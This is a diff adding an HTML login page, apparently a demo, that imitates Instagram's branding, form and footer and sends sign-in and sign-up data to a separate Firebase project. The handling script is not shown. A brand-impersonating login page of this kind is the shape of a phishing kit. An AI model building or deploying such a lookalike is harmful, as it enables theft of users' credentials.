@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preload" href="./assets/img/descarga.png" as="image" />
+    <link rel="icon" type="vmimport.png" href="./assets/img/descarga.png" />
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Billabong:wght@400&display=swap" rel="stylesheet">
+
+    <!-- Firebase SDK -->
+    <script type="module">
+
+
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
+        import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, signInWithPopup, GoogleAuthProvider } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js';
+        import { getFirestore, collection, addDoc, serverTimestamp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js';
+
+        // Configuración de Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyAbsuJ0C9uk5HIpgtwqAaaw-0hUAPlWKKs",
+            authDomain: "instagram-login-demo-3ae71.firebaseapp.com",
+            projectId: "instagram-login-demo-3ae71",
+            storageBucket: "instagram-login-demo-3ae71.firebasestorage.app",
+            messagingSenderId: "388411006759",
+            appId: "1:388411006759:web:2d72254c3390ce012d9302",
+            measurementId: "G-9XVTB793R6"
+        };
+
+        // Inicializar Firebase
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        // Hacer auth y db disponibles globalmente
+        window.auth = auth;
+        window.db = db;
+        window.signInWithEmailAndPassword = signInWithEmailAndPassword;
+        window.createUserWithEmailAndPassword = createUserWithEmailAndPassword;
+        window.signInWithPopup = signInWithPopup;
+        window.GoogleAuthProvider = GoogleAuthProvider;
+        window.collection = collection;
+        window.addDoc = addDoc;
+        window.serverTimestamp = serverTimestamp;
+    </script>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Sección visual izquierda -->
+        <div class="visual-section">
+            <div class="instagram-collage">
+                <img src="assets/img/landing-2x.png" alt="Instagram Collage" class="collage-image">
+            </div>
+        </div>
+
+        <!-- Sección de login derecha -->
+        <div class="login-section">
+            <div class="login-container">
+                <!-- Logo de Instagram -->
+                <div class="logo">
+                    <h1>Instagram</h1>
+                </div>
+
+                <!-- Formulario de login -->
+                <form class="login-form" id="loginForm">
+                    <div class="input-group">
+                        <input type="email" id="email" placeholder="Teléfono, usuario o correo electrónico" required>
+                    </div>
+
+                    <div class="input-group">
+                        <input type="password" id="password" placeholder="Contraseña" required>
+                    </div>
+
+                    <button type="submit" class="login-btn" id="loginBtn">Iniciar sesión</button>
+
+                    <!-- Mensaje de error -->
+                    <div id="errorMessage" class="error-message" style="display: none;"></div>
+
+                    <!-- Mensaje de éxito -->
+                    <div id="successMessage" class="success-message" style="display: none;"></div>
+                </form>
+
+                <!-- Separador -->
+                <div class="separator">
+                    <span class="separator-line"></span>
+                    <span class="separator-text">o</span>
+                    <span class="separator-line"></span>
+                </div>
+
+                <!-- Login con Google -->
+                <button class="google-btn" id="googleLoginBtn">
+                    <span class="google-icon">G</span>
+                    Iniciar sesión con Google
+                </button>
+
+                <!-- Enlaces -->
+                <div class="links">
+                    <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+                </div>
+            </div>
+
+            <!-- Registro -->
+            <div class="signup-container">
+                <p>¿No tienes una cuenta? <a href="#" class="signup-link" id="signupLink">Regístrate</a></p>
+            </div>
+
+            <!-- Formulario de registro (oculto inicialmente) -->
+            <div class="signup-form-container" id="signupForm" style="display: none;">
+                <div class="login-container">
+                    <div class="logo">
+                        <h1>Instagram</h1>
+                    </div>
+
+                    <form class="login-form" id="registerForm">
+                        <div class="input-group">
+                            <input type="text" id="signupEmail" placeholder="Correo electrónico" required>
+                        </div>
+
+                        <div class="input-group">
+                            <input type="password" id="signupPassword" placeholder="Contraseña" required>
+                        </div>
+
+                        <div class="input-group">
+                            <input type="password" id="confirmPassword" placeholder="Confirmar contraseña" required>
+                        </div>
+
+                        <button type="submit" class="login-btn" id="signupBtn">Regístrate</button>
+
+                        <!-- Mensaje de error -->
+                        <div id="signupErrorMessage" class="error-message" style="display: none;"></div>
+
+                        <!-- Mensaje de éxito -->
+                        <div id="signupSuccessMessage" class="success-message" style="display: none;"></div>
+                    </form>
+
+                    <div class="back-to-login">
+                        <a href="#" id="backToLogin">← Volver al login</a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Descarga la app -->
+            <div class="download-app">
+                <p>Descarga la aplicación.</p>
+                <div class="download-buttons">
+                    <a href="#" class="download-btn">App Store</a>
+                    <a href="#" class="download-btn">Google Play</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">Información</a>
+            <a href="#">Blog</a>
+            <a href="#">Empleo</a>
+            <a href="#">Ayuda</a>
+            <a href="#">API</a>
+            <a href="#">Privacidad</a>
+            <a href="#">Condiciones</a>
+            <a href="#">Ubicaciones</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Meta AI</a>
+            <a href="#">Threads</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="footer-bottom">
+            <div class="language-selector">
+                <span>Español</span>
+                <span class="arrow">▼</span>
+            </div>
+            <div class="copyright">
+                © 2025 Instagram from Meta
+            </div>
+        </div>
+    </footer>
+
+    <!-- JavaScript para manejar la autenticación -->
+    <script src="simple-auth.js"></script>
+</body>
+
+</html>
